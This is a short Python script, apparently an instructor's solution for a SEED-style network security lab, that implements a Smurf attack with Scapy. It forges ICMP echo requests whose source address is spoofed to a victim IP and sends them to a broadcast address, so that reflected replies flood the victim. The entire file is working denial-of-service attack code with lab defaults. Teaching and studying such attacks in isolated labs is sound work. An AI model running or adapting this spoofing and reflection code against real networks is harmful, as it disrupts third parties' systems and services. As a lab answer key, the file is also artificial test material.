#!/usr/bin/env python3

import argparse
import time
from scapy.all import ICMP, IP, Raw, send


def parse_args():
    parser = argparse.ArgumentParser(description="Instructor solution: Smurf attack sender.")
    parser.add_argument("--victim", default="10.151.0.71")
    parser.add_argument("--broadcast", default="10.152.0.255")
    parser.add_argument("--count", type=int, default=1)
    parser.add_argument("--interval", type=float, default=0.2)
    parser.add_argument("--payload", default="SEED-SMURF")
    return parser.parse_args()


def main():
    args = parse_args()
    if args.count < 1:
        raise SystemExit("--count must be at least 1")

    packet = (
        IP(src=args.victim, dst=args.broadcast)
        / ICMP(type=8)
        / Raw(load=args.payload.encode())
    )

    for _ in range(args.count):
        send(packet, verbose=0)
        time.sleep(args.interval)


if __name__ == "__main__":
    main()
